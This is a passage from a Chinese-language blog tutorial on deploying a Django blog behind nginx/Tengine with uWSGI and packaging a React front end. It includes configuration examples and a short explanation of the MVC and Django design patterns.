<ul class="org-ul">
<li><a href="http://ip:8000/">http://ip:8000/</a></li>
<li><a href="http://ip:8000/posts/?page=2&amp;size=2">http://ip:8000/posts/?page=2&amp;size=2</a></li>
</ul>

<p>
运行正常。
</p>


<ul class="org-ul">
<li>使用uwsgi启动项目(http协议启动)
<code>uwsgi --http 127.0.0.1:8889 --wsgi-file blog/wsgi.py</code></li>
<li>使用uwsgi启动项目(uwsgi协议启动,二进制通信协议。速度快)
<code>uwsgi --socket 127.0.0.1:8889 --wsgi-file blog/wsgi.py</code></li>
</ul>

<p>
安装uwsgitop获取这个stat值。注意使用这个命令不要使用 <code>--stats-http</code> 选项。
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install uwsgitop

uwsgi --http :8000 --wsgi-file blog/wsgi.py --stats :8001
uwsgitop --frequency 10 127.0.0.1:8001
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9185b89b-14dd-499c-8c9b-daa39778fe37" class="outline-3">
<h3 id="h:9185b89b-14dd-499c-8c9b-daa39778fe37">React项目打包</h3>
<div class="outline-text-3" id="text-h:9185b89b-14dd-499c-8c9b-daa39778fe37">
<p>
rimraf递归删除文件，rm -rf
</p>
<div class="org-src-container">
<pre class="src src-sh">npm install rimraf --save-dev  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25110;&#32773; yarn add rimraf --dev</span>
</pre>
</div>

<p>
在package.json中替换
</p>
<div class="org-src-container">
<pre class="src src-js">  <span style="color: #8b2252;">"scripts"</span>: {
      ...
<span style="color: #8b2252;">"build"</span>: <span style="color: #8b2252;">"rimraf dist &amp;&amp; webpack -p --config webpack.config.prod.js"</span>
</pre>
</div>

<p>
编译
</p>
<div class="org-src-container">
<pre class="src src-sh">npm run build <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25110;&#32773; yarn run build </span>
</pre>
</div>
<p>
编译成功。查看项目目录中的dist目录。dist目录中创建assets目录，将js文件放里面
</p>

<p>
将编译成功后的静态文件放入对应的web静态文件中即可(即nginx相应的web目录)
</p>
</div>
</div>
<div id="outline-container-h:c77e494a-c921-4d14-8256-379cd67d7c6a" class="outline-3">
<h3 id="h:c77e494a-c921-4d14-8256-379cd67d7c6a">nginx uwsgi部署</h3>
<div class="outline-text-3" id="text-h:c77e494a-c921-4d14-8256-379cd67d7c6a">
</div>
<div id="outline-container-h:905435b7-6141-4b92-9c21-ebe0293f0362" class="outline-4">
<h4 id="h:905435b7-6141-4b92-9c21-ebe0293f0362">tengine安装</h4>
<div class="outline-text-4" id="text-h:905435b7-6141-4b92-9c21-ebe0293f0362">
<p>
淘宝提供的nginx
</p>
<ul class="org-ul">
<li><a href="https://tengine.taobao.org/">https://tengine.taobao.org/</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">yum install gcc openssl-devel pcre-devel -y

<span style="color: #a0522d;">version</span>=3.10
wget http://tengine.taobao.org/download/tengine-${<span style="color: #a0522d;">version</span>}.tar.gz
tar xf tengine-${<span style="color: #a0522d;">version</span>}.tar.gz
<span style="color: #483d8b;">cd</span> tengine-${<span style="color: #a0522d;">version</span>}
./configure --help | grep wsgi

./configure <span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;&#19968;&#27493;</span>
make &amp;&amp; make install <span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;&#20108;&#27493;&#12289;&#31532;&#19977;&#27493;</span>
<span style="color: #483d8b;">cd</span> /usr/local/nginx/ <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#23433;&#35013;&#20301;&#32622;</span>
</pre>
</div>

<p>
或者使用openresty
</p>
<ul class="org-ul">
<li><a href="http://openresty.org/cn/">http://openresty.org/cn/</a></li>
</ul>
</div>
</div>
<div id="outline-container-h:b6b1c7f3-daf6-439a-ae14-01dbceaa3ef8" class="outline-4">
<h4 id="h:b6b1c7f3-daf6-439a-ae14-01dbceaa3ef8">http部署</h4>
<div class="outline-text-4" id="text-h:b6b1c7f3-daf6-439a-ae14-01dbceaa3ef8">
<p>
nginx配置
</p>
<ol class="org-ol">
<li><code>^~ /api/</code> 左前缀匹配</li>
<li><code>rewrite ^/api(/.*) $1 break;</code> 重写请求的path</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh">server {
        listen       8888 ;
        listen       [::]:8888 ;
        server_name  0.0.0.0 ;

        location ^~ /api/ {
           rewrite ^/api(/.*) $<span style="color: #a0522d;">1</span> break;
           proxy_pass http://127.0.0.1:8889;
        }

        location / {
           root /data/web;
           index index.html;
        }

        error_page 404 /404.html;
            location = /40x.html {
        }

        error_page 500 502 503 504 /50x.html;
            location = /50x.html {
        }
    }
</pre>
</div>

<p>
修改后启动nginx。
</p>
</div>
</div>
<div id="outline-container-h:f2c7c726-1700-46dc-8945-4f0c8a12e84a" class="outline-4">
<h4 id="h:f2c7c726-1700-46dc-8945-4f0c8a12e84a">uwsgi部署</h4>
<div class="outline-text-4" id="text-h:f2c7c726-1700-46dc-8945-4f0c8a12e84a">
<p>
目前nginx和uwsgi直接使用的是HTTP通信，效率低。改为使用uwsgi通信。
</p>

<p>
使用uwsgi协议的命令行写法如下
</p>
<div class="org-src-container">
<pre class="src src-sh">uwsgi --socket 127.0.0.1:8889 --wsgi-file blog/wsgi.py
</pre>
</div>

<p>
在nginx中配置uwsgi <a href="http://nginx.org/en/docs/http/ngx_http_uwsgi_module.html">http://nginx.org/en/docs/http/ngx_http_uwsgi_module.html</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">server {
    listen       8888 ;
    listen       [::]:8888 ;
    server_name  0.0.0.0 ;

    location ^~ /api/ {
       rewrite ^/api(/.*) $<span style="color: #a0522d;">1</span> break;
       <span style="color: #b22222;">#</span><span style="color: #b22222;">proxy_pass http://127.0.0.1:8889;</span>
       include      uwsgi_params;
       uwsgi_pass   127.0.0.1:8889;
    }

    location / {
       root /data/web;
       index index.html;
    }

    error_page 404 /404.html;
        location = /40x.html {
    }

    error_page 500 502 503 504 /50x.html;
        location = /50x.html {
    }
}
</pre>
</div>

<p>
重新加载nginx配置文件，成功运行。
</p>
<div class="org-src-container">
<pre class="src src-shell">nginx -t
nginx -s reload
</pre>
</div>
</div>
<div id="outline-container-h:8c3dff55-6664-41da-af14-9757d8a1a874" class="outline-5">
<h5 id="h:8c3dff55-6664-41da-af14-9757d8a1a874">uwsgi配置文件</h5>
<div class="outline-text-5" id="text-h:8c3dff55-6664-41da-af14-9757d8a1a874">
<p>
本次pyenv的虚拟目录是/home/python/projects/web，将Django项目所有项目文件和目录放在这个目录下面。
</p>

<p>
uwsgi的配置文件blog.ini也放在这个目录中
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">配置</th>
<th scope="col" class="org-left">&#xa0;</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">socket=127.0.0.1:8889</td>
<td class="org-left">-s, &#x2013;socket</td>
<td class="org-left">使用uwsgi协议通信</td>
</tr>

<tr>
<td class="org-left">chdir = /home/python/projects/web</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">Django项目的根目录</td>
</tr>

<tr>
<td class="org-left">wsgi-file = blog/wsgi.py</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">指定App文件，blog下wsgi.py</td>
</tr>

<tr>
<td class="org-left">master</td>
<td class="org-left">-M, &#x2013;master</td>
<td class="org-left">启用master进程管理工作进程</td>
</tr>

<tr>
<td class="org-left">processes = 4</td>
<td class="org-left">-p,&#x2013;processes</td>
<td class="org-left">启用工作进程数</td>
</tr>

<tr>
<td class="org-left">thread = 2</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">控制工作进程中的线程数</td>
</tr>
</tbody>
</table>

<p>
默认uwsgi启动单进程单线程。
</p>

<p>
blog.ini配置如下：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> /home/python/projects/web

vim blog.ini
[uwsgi]
socket = 127.0.0.1:8889
chdir = /home/python/projects/web
wsgi-file = blog/wsgi.py
master = true
processes = 4
threads = 2

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#21160;&#26381;&#21153;</span>
uwsgi blog.ini
</pre>
</div>

<p>
至此，前后端分离的开发、动静分离的部署的博客项目大功告成！
</p>

<p>
参看
</p>
<ul class="org-ul">
<li><a href="https://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html">https://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html</a></li>

<li>uwsgi协议<a href="https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html">https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html</a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-h:57f85199-6bac-4176-beab-3fd39aebf2a0" class="outline-3">
<h3 id="h:57f85199-6bac-4176-beab-3fd39aebf2a0">部署图</h3>
<div class="outline-text-3" id="text-h:57f85199-6bac-4176-beab-3fd39aebf2a0">

<figure id="org34134e8">
<img src="https://raw.githubusercontent.com/jaspervincent/webimage/master/python/images/img_20250803_004404.png" alt="img_20250803_004404.png" width="50%">

</figure>


<ol class="org-ol">
<li>浏览器通过互联网HTTP协议访问NGINX</li>
<li>静态内容(图片、JS、CSS、文件)都是Nginx负者提供WEB服务</li>
<li>Nginx配置代理。可以死Http和Socket通信。本次使用uwsgi协议</li>
<li>uWSGI服务程序提供uwsgi协议的支持，将从Nginx发来的请求封装后调用WSGI的Application。这个Application可能很复杂，有可能是基于Django框架编写。这个程序将获得请求信息。</li>
<li>通过Django的路由，将请求交给视图函数(类)处理，可能需要访问数据库数据，也可能使用了模板。最终数据返回给浏览器。</li>
</ol>
</div>
</div>
<div id="outline-container-h:91193b33-eb0b-41b9-858d-409153ca09cc" class="outline-3">
<h3 id="h:91193b33-eb0b-41b9-858d-409153ca09cc">MVC设计模式</h3>
<div class="outline-text-3" id="text-h:91193b33-eb0b-41b9-858d-409153ca09cc">
<p>
经典的MVC
</p>
<div class="org-src-container">
<pre class="src src-sh">User --request(HTTP,CLI,etc.)--&gt; Controller &lt;--data, demand--&gt; Model(Database,WS,etc.)
User --request(HTTP,CLI,etc.)--&gt; Controller --data--&gt; View(Templates,layout) --response(HTML,RSS,XML,JSON,etc.)--&gt; User
</pre>
</div>

<ul class="org-ul">
<li>Controller控制器：负者接收用户请求，调用Model完成数据，调用view完成对用户的响应</li>
<li>Model模型：负责业务数据的处理</li>
<li>View视图：负责用户的交互界面</li>
</ul>

<p>
Django
</p>
<div class="org-src-container">
<pre class="src src-sh">user &lt;--&gt; django &lt;--&gt; url &lt;--&gt; View &lt;--&gt; Model
user &lt;--&gt; django &lt;--&gt; url &lt;--&gt; View &lt;--&gt; Template
</pre>
</div>

<ul class="org-ul">
<li>Model层
<ol class="org-ol">
<li>ORM建立对象关系映射，提供数据库操作</li>
</ol></li>
<li>Template层
<ol class="org-ol">
<li>负责数据的可视化，使用HTML、CSS等构成模板，将数据应用到模板中，并返回给浏览器。</li>
</ol></li>
<li>View层
<ol class="org-ol">
<li>Django完成URL映射后，把请求交给View层的视图函数处理，调用Model层完成数据，如有必要调用Template层响应客户端，如果不需要，直接返回数据。</li>
</ol></li>
</ul>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
